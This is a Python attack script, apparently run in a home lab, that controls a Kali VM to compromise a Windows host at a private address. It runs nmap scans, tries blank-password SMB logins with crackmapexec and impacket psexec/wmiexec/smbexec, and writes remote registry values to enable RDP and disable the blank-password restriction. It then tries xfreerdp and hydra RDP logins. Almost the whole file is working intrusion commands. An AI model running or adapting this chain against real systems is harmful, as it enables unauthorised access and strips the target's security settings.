#!/usr/bin/env python3
"""Step 12: Exploit blank password + no firewall
Windows policy blocks remote blank password login by default
but we can try: RDP, WinRM, PsExec alternatives
"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX_KALI = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX_KALI,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX_KALI,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX_KALI,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Full port scan again (firewall off now = more ports should be open)
print("=" * 60)
print("[1] Full port scan (firewall disabled)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -sS -sV -p- --min-rate 5000 -T4 192.168.233.129 2>&1 | tail -40", timeout=300)
print(out)

# 2. Check RDP (3389) specifically
print("\n" + "=" * 60)
print("[2] RDP check (port 3389)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -p 3389 -sV 192.168.233.129 2>&1", timeout=30)
print(out)

# 3. Check WinRM (5985/5986)
print("\n" + "=" * 60)
print("[3] WinRM check (5985/5986)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -p 5985,5986 -sV 192.168.233.129 2>&1", timeout=30)
print(out)

# 4. Try crackmapexec with blank password (force)
print("\n" + "=" * 60)
print("[4] CrackMapExec - blank password test")
print("=" * 60)
out = run_kali(
    "crackmapexec smb 192.168.233.129 -u 'lkjm' -p '' 2>&1 && "
    "echo '---' && "
    "crackmapexec smb 192.168.233.129 -u 'administrator' -p '' 2>&1 && "
    "echo '---' && "
    "crackmapexec smb 192.168.233.129 -u 'guest' -p '' 2>&1 && "
    "echo '---' && "
    "crackmapexec smb 192.168.233.129 -u 'lkjm' -p '' --local-auth 2>&1",
    timeout=30
)
print(out)

# 5. Try impacket-psexec with blank password
print("\n" + "=" * 60)
print("[5] Impacket PsExec with blank password")
print("=" * 60)
out = run_kali(
    "impacket-psexec 'lkjm:@192.168.233.129' -c whoami 2>&1 | head -20 && "
    "echo '---' && "
    "impacket-psexec 'administrator:@192.168.233.129' -c whoami 2>&1 | head -20 && "
    "echo '---' && "
    "impacket-wmiexec 'lkjm:@192.168.233.129' 'whoami' 2>&1 | head -20 && "
    "echo '---' && "
    "impacket-smbexec 'lkjm:@192.168.233.129' 2>&1 | head -20",
    timeout=30
)
print(out)

# 6. Try to modify "blank password restriction" via registry through SMB
print("\n" + "=" * 60)
print("[6] Modify blank password restriction via SMB")
print("=" * 60)
out = run_kali(
    # Try to use reg command through SMB null session
    "impacket-reg 'lkjm:@192.168.233.129' query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -v DisableAutomaticRestartSignOn 2>&1 | head -10 && "
    "echo '---' && "
    # Try to read the specific policy
    "impacket-reg 'lkjm:@192.168.233.129' query 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa' -v LimitBlankPasswordUse 2>&1 | head -10",
    timeout=30
)
print(out)

# 7. Try to enable RDP via SMB (modify registry)
print("\n" + "=" * 60)
print("[7] Enable RDP via registry + add user")
print("=" * 60)
out = run_kali(
    # If we can write to registry via SMB, enable RDP and disable blank password restriction
    "impacket-reg 'lkjm:@192.168.233.129' add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -v fDenyTSConnections -t REG_DWORD -d 0 2>&1 && "
    "echo '---RDP fDenyTSConnections set to 0---' && "
    "impacket-reg 'lkjm:@192.168.233.129' add 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa' -v LimitBlankPasswordUse -t REG_DWORD -d 0 2>&1 && "
    "echo '---LimitBlankPasswordUse set to 0---'",
    timeout=30
)
print(out)

# 8. Try xfreerdp (RDP with blank password)
print("\n" + "=" * 60)
print("[8] xfreerdp RDP connection with blank password")
print("=" * 60)
out = run_kali(
    "timeout 10 xfreerdp /v:192.168.233.129 /u:lkjm /p:'' /cert:ignore 2>&1 | head -20",
    timeout=20
)
print(out)

# 9. Try hydra with blank password on RDP
print("\n" + "=" * 60)
print("[9] Hydra RDP brute force (blank + common passwords)")
print("=" * 60)
out = run_kali(
    "hydra -l lkjm -p '' -t 4 rdp://192.168.233.129 2>&1 && "
    "echo '---' && "
    "hydra -l administrator -p '' -t 4 rdp://192.168.233.129 2>&1",
    timeout=60
)
print(out)

print("\n" + "=" * 60)
print("BLANK PASSWORD EXPLOITATION COMPLETE")
print("=" * 60)
